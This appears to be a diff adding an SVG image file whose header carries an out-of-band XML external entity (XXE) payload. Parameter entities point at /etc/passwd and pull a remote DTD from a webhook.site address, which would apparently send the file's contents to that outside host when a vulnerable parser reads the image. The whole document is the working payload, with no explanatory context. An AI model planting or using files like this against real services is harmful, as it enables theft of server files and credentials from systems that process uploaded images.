@@ -1,0 +1,7 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE svg [
+  <!ENTITY % file SYSTEM "file:///etc/passwd">
+  <!ENTITY % dtd SYSTEM "https://webhook.site/678717ea-2069-483b-896c-b475ffe7bac5/xxe.dtd">
+  %dtd;
+]>
+<svg xmlns="http://www.w3.org/2000/svg" width="800px" height="800px"/>
